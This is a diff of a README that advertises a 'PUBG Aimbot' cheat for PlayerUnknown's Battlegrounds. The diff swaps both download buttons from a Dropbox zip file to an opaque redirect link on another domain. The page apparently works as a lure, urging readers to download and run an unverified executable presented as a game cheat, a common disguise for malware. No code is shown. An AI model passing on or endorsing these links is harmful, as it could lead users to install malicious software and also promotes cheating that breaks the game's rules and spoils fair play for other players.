@@ -2,7 +2,7 @@
 
 The **PUBG Aimbot** is a powerful tool designed to automatically enhance your aiming accuracy and reaction times in **PlayerUnknown's Battlegrounds (PUBG)**. This aimbot provides automatic targeting, helping you lock onto enemies faster and with greater precision, giving you a significant edge in combat. Whether you're a casual player or looking for a way to improve your shooting skills, the PUBG Aimbot ensures better performance during intense firefights.
 
-[![Download PUBG AimBot](https://img.shields.io/badge/Download-PUBG%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download PUBG AimBot](https://img.shields.io/badge/Download-PUBG%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## Features
 
@@ -22,4 +22,4 @@ The **PUBG Aimbot** is a powerful tool designed to automatically enhance your ai
 4. Launch **PUBG** and activate the aimbot using the hotkey specified in the settings.
 5. Customize the aimbot settings to suit your personal preferences (sensitivity, FOV, headshot priority, etc.).
 
-[![Download PUBG AimBot](https://img.shields.io/badge/Download-PUBG%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download PUBG AimBot](https://img.shields.io/badge/Download-PUBG%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
